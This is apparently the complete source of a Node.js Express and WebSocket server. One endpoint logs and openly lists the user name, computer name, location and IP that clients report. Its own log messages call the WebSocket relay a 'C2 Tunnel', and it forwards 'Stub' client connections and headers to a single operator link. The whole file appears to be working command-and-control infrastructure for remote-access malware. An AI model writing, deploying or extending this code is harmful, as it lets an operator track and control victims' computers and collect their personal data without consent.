const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const crypto = require('crypto');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ noServer: true });

const port = process.env.PORT || 10000;

let tunnelWs = null;
const activeConnections = new Map();

function generateId() {
  return crypto.randomBytes(8).toString('hex');
}

// ========== NEW: Parse JSON bodies for location data ==========
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ========== LOCATION ENDPOINTS ==========
app.post('/location', (req, res) => {
  const locationData = req.body;
  const timestamp = new Date().toISOString();
  
  console.log(`[LOCATION] ${timestamp}`);
  console.log(`  User: ${locationData.user || 'unknown'}`);
  console.log(`  Computer: ${locationData.computer || 'unknown'}`);
  console.log(`  Location: ${locationData.location || 'not provided'}`);
  console.log(`  IP: ${req.ip || 'unknown'}`);
  console.log(`  Full data: ${JSON.stringify(locationData)}`);
  console.log('-'.repeat(50));
  
  // Store in memory
  if (!global.locationLogs) {
    global.locationLogs = [];
  }
  global.locationLogs.push({
    timestamp,
    ip: req.ip,
    ...locationData
  });
  
  res.json({ 
    status: 'ok', 
    message: 'Location received',
    id: global.locationLogs.length 
  });
});

app.get('/locations', (req, res) => {
  res.json({
    total: global.locationLogs?.length || 0,
    logs: global.locationLogs || []
  });
});

// ========== EXISTING ENDPOINTS ==========
app.get('/ping', (req, res) => {
  res.send('ok');
});

app.get('/location-test', (req, res) => {
  res.send(`
    <html>
      <head><title>Location API</title></head>
      <body>
        <h1>Location API Active</h1>
        <p>POST to /location with JSON data</p>
        <p>Example: {"location":"New York","user":"john","computer":"PC01"}</p>
        <p><a href="/locations">View all stored locations</a></p>
      </body>
    </html>
  `);
});

// Serve static files
app.use(express.static(path.join(__dirname, '..')));

// 404 handler
app.use((req, res) => {
  res.status(404).send('Not Found');
});

// ========== WEBSOCKET TUNNEL (existing) ==========
wss.on('connection', (ws, req) => {
  if (req.url.startsWith('/_tunnel')) {
    if (tunnelWs) {
      console.log('Replacing existing tunnel connection.');
      tunnelWs.close();
    }
    tunnelWs = ws;
    console.log('C2 Tunnel connected successfully.');

    ws.on('message', (message) => {
      try {
        const payload = JSON.parse(message.toString());
        if (payload.type === 'ws_message') {
            const clientWs = activeConnections.get(payload.req_id);
            if (clientWs && clientWs.readyState === WebSocket.OPEN) {
                clientWs.send(payload.data);
            }
        } else if (payload.type === 'ws_close') {
            const clientWs = activeConnections.get(payload.req_id);
            if (clientWs) {
                clientWs.close();
                activeConnections.delete(payload.req_id);
            }
        }
      } catch (err) {
        console.error('Tunnel message error:', err);
      }
    });

    ws.on('close', () => {
      console.log('C2 Tunnel disconnected.');
      tunnelWs = null;
      for (const [id, clientWs] of activeConnections.entries()) {
        clientWs.close();
      }
      activeConnections.clear();
    });
    return;
  }

  // Handle Stub WebSocket connections
  if (!tunnelWs || tunnelWs.readyState !== WebSocket.OPEN) {
    ws.close(1011, 'Tunnel not connected');
    return;
  }

  const reqId = generateId();
  activeConnections.set(reqId, ws);

  tunnelWs.send(JSON.stringify({
    type: 'ws_connect',
    req_id: reqId,
    url: req.url,
    headers: req.headers
  }));

  ws.on('message', (message) => {
    if (tunnelWs && tunnelWs.readyState === WebSocket.OPEN) {
      tunnelWs.send(JSON.stringify({
        type: 'ws_message',
        req_id: reqId,
        data: message.toString()
      }));
    }
  });

  ws.on('close', () => {
    activeConnections.delete(reqId);
    if (tunnelWs && tunnelWs.readyState === WebSocket.OPEN) {
      tunnelWs.send(JSON.stringify({
        type: 'ws_close',
        req_id: reqId
      }));
    }
  });
});

server.on('upgrade', (request, socket, head) => {
  wss.handleUpgrade(request, socket, head, (ws) => {
    wss.emit('connection', ws, request);
  });
});

server.listen(port, () => {
  console.log(`Render Tunnel Proxy listening on port ${port}`);
  console.log(`Location endpoint ready at /location`);
});
